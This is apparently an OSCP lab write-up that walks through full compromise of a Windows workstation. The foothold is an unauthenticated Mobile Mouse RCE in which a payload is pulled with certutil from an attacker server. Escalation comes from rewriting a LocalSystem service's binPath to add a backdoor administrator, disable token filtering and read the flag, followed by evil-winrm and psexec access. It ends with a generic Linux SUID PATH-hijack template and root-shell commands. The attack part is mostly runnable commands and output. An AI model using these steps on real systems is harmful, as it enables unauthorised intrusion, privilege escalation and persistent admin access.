192.168.133.155 — oscp-mouse

A workstation running a phone-as-a-mouse server that will type anything the network sends it. That is a shell as whoever is logged in — a standard user. The escalation is not a CVE: it is a third-party service, running as LocalSystem, whose binary any local user may rewrite and whose service object any local user may reconfigure.

01

Reconnaissance

Six ports, and the one nmap calls unknown

Goal: find every reachable service, then identify the product behind each one. A port number is only a door; the version behind it decides whether the door opens.

1.1 The full TCP scan

command
export TARGET=192.168.133.155
nmap -Pn -n -p- --min-rate 2000 --max-retries 2 -T4 \
     -oN exam.$TARGET/${TARGET}_discovery.nmap $TARGET
output
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
5986/tcp  open  wsmans
7680/tcp  open  pando-pub
9099/tcp  open  unknown
9999/tcp  open  abyss
35913/tcp open  unknown

Six ports out of 65535, and every other port answers closed (reset) rather than filtered. That distinction is worth a sentence: closed means the host replied with RST, so a firewall is not dropping traffic here — this is a workstation with a handful of services, not a hardened perimeter.

1.3 The port nmap could not name

9099 has no entry in nmap's service database, so -sV prints unknown. That does not mean the probe learned nothing: the fingerprint-strings block recorded the server's own reply, and the reply names the product — Server: Mobile Mouse Server. Two cheap confirmations:

command
curl -s -i http://192.168.133.155:9099/
nmap -Pn -p 9099 -sV --version-all --script=banner 192.168.133.155
output
HTTP/1.0 200 OK
Server: Mobile Mouse Server
Content-Type: text/html
Content-Length: 321

<HTML><HEAD><TITLE>Success!</TITLE>...

Reading it: an HTTP-shaped 321-byte page titled Success! on a port that is not a web server is the signature of a desktop application's control channel, exposed to the LAN. Port 35913 is the same product's WebSocket listener — nmap called it unknown too, and it is the second documented vector.

Method note. When -sV says unknown, do not drop the port. Grep the XML for fingerprint-strings before re-scanning; the product name is usually in the banner, the TLS certificate, or the 404 body.

02

Mobile Mouse

CVE-2023-31902 and its real precondition

Goal: decide whether the product on 9099 is exploitable, and understand how it executes commands before touching the target.

2.1 What the product is

Mobile Mouse turns a phone into a wireless mouse and keyboard. The Windows-side Mobile Mouse Server listens on TCP 9099 for the control protocol and 35913 for WebSocket clients. By default it has no password, and it injects whatever it receives into the interactive desktop.

Field Value
Product Mobile Mouse Server (RPA Technology)
Version on host 3.6.4 — read from InstalledProducts in chapter 04
Control 9099/tcp — unauthenticated
WebSocket 35913/tcp
CVE CVE-2023-31902 — pre-auth RCE, CVSS 9.8
Module exploit/windows/misc/mobile_mouse_rce

2.2 Confirm the exploit exists

command
searchsploit mobile mouse
msfconsole -q -x "search mobile_mouse_rce; exit"
output
Exploit: Mobile Mouse 3.6.0.4 - Remote Code Execution (RCE)
         EDB-ID 51010

Version caveat. The published exploit targets 3.6.0.4 and below. This host runs 3.6.4 and the module still worked — the protocol did not change between those builds. Treat a version range as a hint about where to look, then prove it against the actual host.

2.3 The mechanism — a keyboard, not a memory bug

There is no buffer overflow and no deserialisation gadget. The server is a keyboard: given a message, it types. The Metasploit module uses that to:

  1. open a command prompt on the interactive desktop,
  2. run certutil to download a payload from an attacker-hosted HTTP server (SRVHOST),
  3. stage it in C:\Windows\Temp\ and execute it.

Two consequences follow directly from that design, and both shape the rest of the box:

  • The shell is whoever is logged in. The server does not elevate; it types as the session owner. Expect a standard user, not SYSTEM.
  • It needs a live desktop session. If nobody is logged on, there is no window to type into. The Seatbelt output in chapter 04 confirms the session exists (explorer.exe, dwm.exe running for OSCP\Tim).

2.4 Preconditions, stated before firing

Precondition Evidence If absent
Vulnerable build installed InstalledProducts → Mobile Mouse 3.6.4 nothing to attack
Server listening nmap 9099 open, banner Mobile Mouse Server installed-but-dead
No password set default configuration; the module requires it the client-side PIN blocks injection
Interactive desktop session OSCP\Tim logged on, shell earlier in C:\Users\Tim keystrokes land nowhere

The first three were answered from Kali, before any shell. The fourth is the one that bites on servers — and it is the reason a "critical, 9.8" RCE is a much smaller problem on a locked-down host.

04

Enumeration

Seatbelt for identity, PowerUp for the service

Goal: answer two questions with two different tools. Seatbelt answers who am I and what may I do; PowerUp answers what on this host is misconfigured. The service that owns the box is found by the second, and dismissed-or-confirmed by hand.

4.1 Get the tools onto the host

command
cd C:\Users\Tim\AppData\Local\Temp
iwr http://192.168.45.158/Seatbelt.exe -OutFile .\Seatbelt.exe
iwr http://192.168.45.158/PowerUp.ps1  -OutFile .\PowerUp.ps1

4.2 Seatbelt — -group=all -full

command
.\Seatbelt.exe -group=all -full

The report is large. Four sections decide the whole box.

OSInfo — the starting position:

output
Hostname            :  oscp
Username            :  OSCP\Tim
ProductName         :  Windows 10 Pro
Build               :  19045.2251
HighIntegrity       :  False
IsLocalAdmin        :  False

TokenPrivileges — the decision point:

output
SeShutdownPrivilege:  DISABLED
SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
SeUndockPrivilege:  DISABLED
SeIncreaseWorkingSetPrivilege:  DISABLED
SeTimeZonePrivilege:  DISABLED

Five benign privileges. No SeImpersonatePrivilege, no SeAssignPrimaryToken, no SeDebug. That single section retires the entire potato family — GodPotato, PrintSpoofer, RoguePotato, JuicyPotato — and any token-stealing route, because every one of them needs one of those privileges. Reading it here saves an hour of failed getsystem variants.

LocalGroups — confirms the picture: Tim is in Users; Administrators holds Admin, Administrator, cloudbase-init.

InstalledProducts — the version that matters:

output
DisplayName    : Mobile Mouse
DisplayVersion : 3.6.4

DisplayName    : MilleGPG5 5.9.1 Ottobre 2022-(x64)

Two third-party packages. Mobile Mouse explains the foothold from chapter 03; MilleGPG5 is the lead that becomes the escalation.

Services — the section nobody reads closely enough. It prints ServiceCommand, BinaryPathSDDL and ServiceSDDL for every service, which is enough to spot a weak ACL without touching sc:

output
Name            : GPGOrchestrator
User            : LocalSystem
State           : Running
StartMode       : Auto
ServiceCommand  : "C:\Program Files\MilleGPG5\GPGService.exe"
BinaryPathSDDL  : O:BAG:...D:AI(A;;FR;;;BU)(A;ID;0x1301bf;;;BU)(A;ID;FA;;;SY)...
ServiceSDDL     : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
                  (A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
                  (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BU)

0x1301bf for BU in BinaryPathSDDL is FILE_ALL_ACCESS-adjacent — read, write, delete. And the final ACE of ServiceSDDL gives BU DC+RP+DT+WD. Both are written down here, before any tool has an opinion.

4.3 PowerUp — the tool that names it

command
Import-Module .\PowerUp.ps1
Invoke-AllChecks

Narrowly, to skip the noise:

command
Get-ModifiableServiceFile
output
ServiceName                     : GPGOrchestrator
Path                            : "C:\Program Files\MilleGPG5\GPGService.exe"
ModifiableFile                  : C:\Program Files\MilleGPG5\GPGService.exe
ModifiableFilePermissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'GPGOrchestrator'
CanRestart                      : True

That is the finding. CanRestart: True is what makes it a privilege escalation rather than a file upload: PowerUp has already checked that the current user can stop/start the service too.

4.4 Signal vs noise

PowerUp also reported edgeupdate twice. Both are false positives, and seeing why is the useful part:

Field edgeupdate (noise) GPGOrchestrator (real)
ModifiableFile C:\ — the volume root, not the binary the executable itself
Permission AppendData/AddSubdirectory on the root Modify on the binary
StartName LocalSystem LocalSystem
CanRestart False True

C:\ allows Authenticated Users to append a subdirectory — which is true of every Windows install and grants nothing on the service's own binary. Only the second row is exploitable.

Method note. CanRestart: False downgrades any writable-binary finding to "you can write a file, you cannot make it run". Always read that flag before planning the escalation — and then confirm it by hand, because a scanner's ACL parser is not authoritative.

05

Privilege escalation

Users:(M) + DC/RP/DT → binPath

Goal: turn PowerUp's claim into SYSTEM. Verify the ACL by hand, then choose between replacing the binary and reconfiguring the service — the second writes nothing to disk.

5.1 Verify, don't trust

command
sc.exe qc GPGOrchestrator
icacls "C:\Program Files\MilleGPG5\GPGService.exe"
output
SERVICE_NAME: GPGOrchestrator
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        BINARY_PATH_NAME   : "C:\Program Files\MilleGPG5\GPGService.exe"
        SERVICE_START_NAME : LocalSystem

C:\Program Files\MilleGPG5\GPGService.exe BUILTIN\Users:(R)
                                          BUILTIN\Users:(I)(M)
                                          NT AUTHORITY\SYSTEM:(I)(F)
                                          BUILTIN\Administrators:(I)(F)
                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)

BUILTIN\Users:(I)(M) — inherited Modify. Inherited is the important word: this is not a per-user grant that missed cleanup, it is the file's default ACL, so every local user can rewrite a binary that LocalSystem executes.

5.2 Read the service object as well

command
sc.exe sdshow GPGOrchestrator
output
D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
  (A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BU)

The last ACE, for BUILTIN\Users (BU):

Right Means
DC change service configuration — write binPath
RP start the service
DT stop the service
WD rewrite the DACL
LC/SW/RP/WP/LO/CR/RC query, enumerate, read — harmless

So there are two independent weaknesses, and the second one is strictly better:

  1. The binary is writable. Replace GPGService.exe with an executable and start the service. Downside: a file lands in Program Files, which is exactly what antivirus watches.
  2. The service object is writable. Repoint binPath at cmd.exe with an argument. No binary to scan, nothing dropped on disk, and the command runs as LocalSystem.

5.3 Execute as SYSTEM

From cmd.exe (see 5.5 — the quoting matters):

command
sc.exe stop GPGOrchestrator
sc.exe config GPGOrchestrator binPath= "cmd.exe /c net user hacker P@ssw0rd123! /add & net localgroup administrators hacker /add"
sc.exe start GPGOrchestrator
output
SERVICE_NAME: GPGOrchestrator
        STATE              : 4  RUNNING
[SC] ChangeServiceConfig SUCCESS
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

1053 is the success signal. SCM waits ~30 seconds for the process to call StartServiceCtrlDispatcher and report SERVICE_RUNNING. cmd.exe never does — it runs the command line and exits. The command executed as LocalSystem; only the service handshake failed. Do not read 1053 as "didn't work", and do not blindly retry — check the effect.

The & matters: the account is created by the first net user, and the group add runs regardless of the first command's exit status. Two separate sc config + start cycles are cleaner if you want each step's output.

5.4 Confirm it

command
net user hacker
net localgroup administrators
output
User name                    hacker
Local Group Memberships      *Administrators       *Users

Alias name     administrators
Members
-------------------------------------------------------------------------------
Admin
Administrator
cloudbase-init
hacker
The command completed successfully.

A local administrator now exists with a password of our choosing. Escalation is complete; what is left (chapter 06) is turning it into a usable admin session.

5.5 The quoting trap, and the 1053 that wasn't

Two mistakes cost a round trip each, and both are worth knowing:

Wrong shell, wrong quotes. In cmd.exe, single quotes are ordinary characters — they do not group arguments:

output
C:\> sc.exe config GPGOrchestrator binPath= 'cmd.exe /c reg add ... /f'
DESCRIPTION:
        Modifies a service entry in the registry and Service Database.
USAGE:
        sc <server> config [service name] <option1> <option2>...

sc printed its usage banner and changed nothing. Under PowerShell (PS C:\>) the same single-quoted form is correct; under cmd.exe it must be double quotes. The prompt tells you which shell you are in — check it before blaming the tool.

Stale binPath. Because that config failed, the next sc.exe start re-ran the previous binPath (a type proof.txt command), which is why no reverse shell appeared even though a payload had been uploaded. binPath persists until changed:

command
sc.exe qc GPGOrchestrator

Run that before every start. If it does not show the command you just intended, the config failed and start is re-running history.

06

Loot & admin shell

proof.txt, token filtering, WinRM over 5986

Goal: read proof.txt with the SYSTEM primitive already in hand, then fix the one thing that stops the new administrator from logging in over the network.

6.1 The flag, read by SYSTEM

Reuse the same primitive — one command line, nothing written to disk:

command
sc.exe stop GPGOrchestrator
sc.exe config GPGOrchestrator binPath= "cmd.exe /c type C:\Users\Administrator\Desktop\proof.txt > C:\Users\Tim\AppData\Local\Temp\proof.txt & icacls C:\Users\Tim\AppData\Local\Temp\proof.txt /grant Tim:F"
sc.exe start GPGOrchestrator
type C:\Users\Tim\AppData\Local\Temp\proof.txt
output
4a456f445abc93450df024fc1b57bc23

icacls /grant Tim:F is there because the redirect is performed by SYSTEM, so the file would otherwise be unreadable by the account that asked for it.

Order matters. binPath keeps whatever was set last. sc start after a failed config re-runs the previous command line. Confirm with sc.exe qc GPGOrchestrator before each start.

6.2 Why the new admin cannot log in yet

hacker is in Administrators, but it is not RID 500. With LocalAccountTokenFilterPolicy unset — the default — a network logon by any other local administrator yields a filtered token: the Administrators SID is present but deny-only. WinRM's authorization check then fails, and the error looks exactly like a wrong password.

Logon type Token Effect
Interactive (console, RDP) full admin works
Network (SMB, WinRM, WMI) filtered by default admin rights stripped

This host does not expose 3389, so RDP is not an option — the policy has to change.

6.3 Flip the policy with the same primitive

command
sc.exe config GPGOrchestrator binPath= "cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
sc.exe start GPGOrchestrator
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy
output
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
    LocalAccountTokenFilterPolicy    REG_DWORD    0x1

6.4 WinRM over HTTPS

Port 5986 was open in the very first scan, with a CN=Cloudbase-Init WinRM certificate — the image ships remote management enabled.

command
evil-winrm -i 192.168.133.155 -u hacker -p 'P@ssw0rd123!' -S -P 5986
output
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
oscp\hacker
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat proof.txt
4a456f445abc93450df024fc1b57bc23

-S enables TLS; -P 5986 overrides the default 5985 (which this host does not expose).

Inside the session, whoami /groups shows BUILTIN\Administrators as enabled, not deny-only — that is the proof the token filter is off, and the difference between "admin on paper" and admin.

6.5 What this session is good for

oscp\hacker is a full local administrator. From Kali the same credentials give SYSTEM without any payload:

command
impacket-psexec hacker:'P@ssw0rd123!'@192.168.133.155
output
nt authority\system

Useful for dumping SAM/LSA or for anything that insists on SYSTEM rather than admin. It is also, deliberately, the same service technique from chapter 05 — psexec simply uploads its own service binary instead of reconfiguring an existing one.

07

Cleanup & lessons

Restore the service; what found what

Goal: put the service back exactly as it was, remove the accounts and artefacts this box was made to leave behind, and record what actually found the way in.

7.1 Restore the service — order is not optional

GPGOrchestrator currently points at a reg add command line, and (if the binary route was used) the executable in Program Files is a payload. The hijacked service cannot start, so restore the binary first, then the configuration, then start:

command
copy /y "C:\Users\Tim\AppData\Local\Temp\GPGService.exe.bak" "C:\Program Files\MilleGPG5\GPGService.exe"
sc.exe config GPGOrchestrator binPath= "\"C:\Program Files\MilleGPG5\GPGService.exe\""
sc.exe start GPGOrchestrator
sc.exe query GPGOrchestrator
output
SERVICE_NAME: GPGOrchestrator
        STATE              : 4  RUNNING

If it still returns 1053, check Get-MpThreatDetection: Defender may have quarantined the payload that was copied over the legitimate binary, in which case re-copy the backup and start again.

7.2 Revert the changes made for access

command
sc.exe config GPGOrchestrator binPath= "cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 0 /f"
sc.exe start GPGOrchestrator

net user hacker /delete
del C:\Users\Tim\AppData\Local\Temp\Seatbelt.exe C:\Users\Tim\AppData\Local\Temp\PowerUp.ps1
del C:\Users\Tim\AppData\Local\Temp\proof.txt

Then point binPath back one last time and confirm the service is on the real binary:

command
sc.exe config GPGOrchestrator binPath= "\"C:\Program Files\MilleGPG5\GPGService.exe\""
sc.exe qc GPGOrchestrator
Artefact Where Removed by
hacker local admin SAM net user hacker /delete

7.4 Lessons

  • A version number beats a port number. 9099 was unknown to nmap, but the version probe still captured the banner that named the product. Never discard a port because the service DB has no entry for it.
  • Read your own token first. TokenPrivileges in Seatbelt retired the potato family in one glance. Skipping it means trying five exploits that cannot work.
  • CanRestart is the discriminator. A writable service binary you cannot restart is a file-upload problem; with restart rights it is SYSTEM. Read that flag before planning.
  • Service ACLs are a second, quieter door. DC + RP for BUILTIN\Users allows repointing binPath with nothing written to disk — no payload for antivirus to inspect, no backup to restore.
  • 1053 means "your process is not a service". For a one-shot cmd.exe that is success. Verify by effect, not by exit code.
  • Know which shell you are in. Single quotes under cmd.exe silently produce a usage banner and no change — and a later sc start then re-runs the previous command line.
  • Admin is not a usable admin. Local admin accounts other than RID 500 are filtered over the network until LocalAccountTokenFilterPolicy is set. That is why WinRM said "access denied" to a password that was correct.
  • Inherited ACLs are systemic. BUILTIN\Users:(I)(M) on an installer's service binary is not a one-off misconfiguration on this host — it is what that installer ships to every deployment.
08

Methodology

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Phase 1 — Reachability and TCP

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

Decision: for each open port, ask "what is the configuration weakness most likely to be, given this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.

Phase 3 — Per-service enumeration

For each service, in the order that historically pays fastest.

HTTP/HTTPS

  • Vhosts: ffuf -u http://$TARGET/ -H "Host: FUZZ" -w <subdomains> -fr "<default page text>".
  • Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.

FTP

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.

Binary analysis

command
file bin                                  # "not stripped" = function names survive
strings -a bin | head -40                 # system / popen / exec / bare command names
objdump -d -M intel bin | sed -n '/<main>:/,/^$/p'
readelf -d bin | grep -E 'BIND_NOW|FLAGS' # full RELRO => forget GOT overwrite
objdump -s -j .rodata bin | head          # resolve the strings passed to system()

Reconstructing source from a small binary:

output
+ setuid / setgid  →  setuid(0); setgid(0);
+ lea rdi,[rip+...] →  the argument is a fixed string
+ call system@plt  →  system("...")

Privesc — PATH hijack template

command
D=$(mktemp -d /tmp/x.XXXXXX)
cat > "$D/chpasswd" <<'EOF'
#!/bin/bash
id > /tmp/root_id.txt
cat /root/proof.txt > /tmp/root_proof.txt 2>&1
chmod 644 /tmp/root_id.txt /tmp/root_proof.txt
EOF
chmod +x "$D/chpasswd"

## name the faked binary exactly as the SUID program invokes it
PATH="$D:$PATH" /path/to/suid_binary

cat /tmp/root_id.txt

Works only when the SUID binary calls setuid(0)/seteuid(0) before system(). If it does not, the shell drops privileges and the payload runs as you. Check the disassembly order first.

Interactive variant:

command
printf '#!/bin/bash\n/bin/bash -p\n' > "$D/chpasswd"; chmod +x "$D/chpasswd"
PATH="$D:$PATH" /path/to/suid_binary

Cleanup

command
D=$(mktemp -d /tmp/c.XXXXXX)
printf '#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n' > "$D/chpasswd"
chmod +x "$D/chpasswd"
PATH="$D:$PATH" /path/to/suid_binary
ls -la /tmp/root_id.txt        # must be "No such file or directory"
